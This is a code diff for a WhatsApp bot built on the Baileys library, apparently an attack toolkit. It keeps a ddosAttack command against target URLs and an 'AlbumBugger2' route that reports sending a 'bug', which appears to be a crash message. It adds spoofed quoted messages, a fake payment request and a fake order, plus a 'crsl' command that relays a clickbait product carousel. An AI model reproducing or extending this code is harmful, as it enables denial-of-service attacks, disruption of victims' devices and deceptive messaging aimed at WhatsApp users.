@@ -64,6 +64,12 @@ async function ai(prompt) {
   });
 }
 
+async function image(url) {
+const { imageMessage } = await generateWAMessageContent({ image: { url },}, {
+  upload: sock.waUploadToServer
+  })
+  return imageMessage
+}
 
 const activeSockets = new Map();
 async function ensureSocketForNumber(phoneNumber) {
@@ -148,12 +154,12 @@ async function ensureSocketForNumber(phoneNumber) {
     const text = body.slice(usedPrefix.length + command.length + 1).trim();
 
 const frpay = {key : { remoteJid:"0@s.whatsapp.net",id:"REQPAY"+Math.floor(Math.random()*1e6),participant:"0@s.whatsapp.net"},message:{requestPaymentMessage:{currencyCodeIso4217:"IDR",amount1000:String(Math.floor(Math.random()*5e5+1e5)),requestFrom:msg.sender,noteMessage:{stickerMessage:{url:"https://mmg.whatsapp.net/v/t62.15575-24/519772994_1880450272736126_8894645943848884651_n.enc?ccb=11-4&oh=01_Q5Aa2AGONA8PtRh9eqxl0EDqvxr_gJXfmHtX6uety7GfTwYnvg&oe=68986DC0&_nc_sid=5e03e0&mms3=true",fileSha256:"e9fy2V2mLQdwJfLlVkY+seoBfAafbvgKJ6K9bdw9jxM=",fileEncSha256:"o7iQKQWiOOBpWSYGY6oefYggCmDU7UO9W1tZx8J6aoY=",mediaKey:"o2mu3wa+ynfKJ1kjQDMtDD5RBSBH6tTR801EFz9coDQ=",mimetype:"image/webp",height:64,width:64,directPath:"/o1/v/t24/f2/m238/AQNTXHve8NJAcYVaqLBmTCMx1r-hxBGF-ht85xYI1NlmMAW40ZSd5NJAAxzEedNN7xguj6KugTE4EOOYdh1bwzguSPLM7DRknWk3YydxiQ?ccb=9-4&oh=01_Q5Aa2AFmBMIBTxdhwGiiXKQgFIwREBJW1kHuqDutw2XEOzhfNg&oe=68984648&_nc_sid=e6ed6c"}},amount:{value:"2420",offset:1e3,currencyCode:"IDR"},background:{id:"100",fileLength:"928283",width:1e3,height:1e3,mimetype:"image/webp",placeholderArgb:4294901760,textArgb:4294967295,subtextArgb:4278190080}}}};
-const forder = {key : {remoteJid:"status@broadcast",fromMe:false,id:"BAE5C9E3C9A6C8D6",participant:"0@s.whatsapp.net"},message:{orderMessage:{productId:"8569472943180260",title:null,description:null,currencyCode:"IDR",priceAmount1000:"91000",message:"whyuxD",thumbnailUrl:"https://img100.pixhost.to/images/718/540724665_a7bf39d4.jpg",surface:"whyuxD"}}};
+const forder = {key : {remoteJid:"status@broadcast",fromMe:false,id:"BAE5C9E3C9A6C8D6",participant:"0@s.whatsapp.net"},message:{orderMessage:{productId:"8569472943180260",title:null,description:null,currencyCode:"IDR",priceAmount1000:"91000",message:text,thumbnailUrl:"https://img100.pixhost.to/images/718/540724665_a7bf39d4.jpg",surface:"whyuxD"}}};
 const fpay = { key: { fromMe: false, participant: "0@s.whatsapp.net", ...(msg.chat ? { remoteJid: "status@broadcast" } : {}) }, message: { "paymentInviteMessage": { "serviceType": 3, "expiryTimestamp": "200"}}};
 
     const reply = async (teks) => {
       try {
-        await sock.sendMessage(from, { text: teks }, { quoted: msg });
+        await sock.sendMessage(from, { text: teks }, { quoted: frpay });
       } catch (e) {
         try { await sock.sendMessage(from, { text: teks }); } catch (_) {}
       }
@@ -169,19 +175,76 @@ const fpay = { key: { fromMe: false, participant: "0@s.whatsapp.net", ...(msg.ch
         return;
       }
       try {
-        await ddosAttack(sock, urlTarget, parseInt(duration), parseInt(concurrency), method.toUpperCase());
+        await ddosAttack(sock, urlTarget, parseInt(duration), parseInt(concurrency), method.toUpperCase(), reply);
       } catch (err) {
         console.error("Error running ddos:", err);
         await reply("❌ Error: " + err.message);
       }
     }
+    if (command === "crsl") {
+let mg = generateWAMessageFromContent(msg.chat, {
+viewOnceMessage: {
+message: {
+interactiveMessage: {
+body: {
+text: "notification!!"
+},
+footer: {
+text: "whyuxD"
+},
+carouselMessage: {
+messageVersion: 1,
+cards: [
+{
+header: proto.Message.InteractiveMessage.Header.create({
+title: "¢",
+subtitle: "whyuxD",
+productMessage: {
+product: {
+productImage: await image("https://img100.pixhost.to/images/718/540724665_a7bf39d4.jpg"),
+productId: "9116471035103640",
+title: "hai",
+description: "",
+currencyCode: "IDR",
+priceAmount1000: "5000200",
+retailerId: "4144242",
+url: "",
+productImageCount: 1
+},
+businessOwnerJid: "6283189053897@s.whatsapp.net"
+},
+hasMediaAttachment: false
+}),
+body: {
+text: "Hei... jangan buru-buru skip... Ada sesuatu yang ingin ku kasih tau, tapi tdk bisa ditulis langsung di sini. Kalau penasaran, tekan tombol di bawah ini agar kamu mengerti maksudku. ku jamin kamu akan kaget setelah melihat isinya!!"
+},
+nativeFlowMessage: {
+buttons: [
+{
+"name": "quick_reply",
+"buttonParamsJson": "{\"display_text\":\"klik disini\",\"id\":\"dongo\"}"
+}
+]
+}
+}
+]
+}
+}
+}
+}
+, { userJid: msg.sender, quoted: forder }
+);
+await sock.relayMessage(mg.key.remoteJid, mg.message, {
+messageId: mg.key.id,
+});
+}
     if (command === "ai") {
       if (!text) {
         await reply("⚠️ Masukkan text!\nContoh: .ai siapa presiden indonesia sekarang?");
         return;
       }
       try {
-        const result = await ai(text); // jalankan function ai
+        const result = await ai(text); 
         await reply(result);
       } catch (err) {
         console.error("messages.upsert error (ai):", err);
@@ -427,9 +490,9 @@ async function AlbumBugger2(target)  {
       await AlbumBugger2(jid)
       return res.json({ success: true, message: "Bug telah dikirim" });
     } else if (type === "bug_c") {
-      message = "PING\n\nInformasi: device terkonek via API.\nTime: " + new Date().toISOString();
+      message = "Time: " + new Date().toISOString();
       await sock.sendMessage(jid, { text: message });
-      return res.json({ success: true, message: "Ping/info terkirim (bug_c)" });
+      return res.json({ success: true, message: "Ping" });
     } else {
       return res.status(400).json({ error: "Unknown type" });
     }
